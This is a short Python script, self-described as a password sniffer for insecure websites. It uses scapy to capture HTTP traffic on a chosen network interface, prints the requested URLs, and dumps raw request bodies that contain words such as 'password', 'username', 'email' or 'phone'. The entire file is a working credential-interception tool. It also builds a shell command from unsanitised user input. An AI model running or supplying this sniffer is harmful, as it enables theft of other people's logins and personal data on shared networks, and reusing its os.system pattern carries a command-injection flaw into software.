#!/usr/bin/python

import os
import scapy.all as scapy
from scapy_http import http

def execute():
	os.system("clear")
	os.system("figlet -f fire_font-k 'PASSWORD SNIFFER FOR UNSECURE WEBSITES'|lolcat -a -d 1 -F 0.5")
	os.system('echo "\t╔───────────────────────────────────────────────╗" | lolcat -a -d 1')
	os.system('echo "\t|           Created By: Rajnish Kumar           |" | lolcat -a -d 1')
	os.system('echo "\t┖───────────────────────────────────────────────┙\n\n" | lolcat -a -d 1')


def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_packets)


def process_packets(packet):
	if packet.haslayer(http.HTTPRequest):
		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
		print(url)
		if packet.haslayer(scapy.Raw):
			load = packet[scapy.Raw].load
			for i in words:
				if i in str(load):
					print(load)
					break


net_inter = str(input("|> Enter Network Interface Name You Want To Sniff: "))
words = ["password","user","username","login","pass","User","Password","User ID", "user id", "user name", "EMAIL", "email", "Phone", "phone", "identifier"]
os.system("echo {}".format(net_inter))
sniff(net_inter)
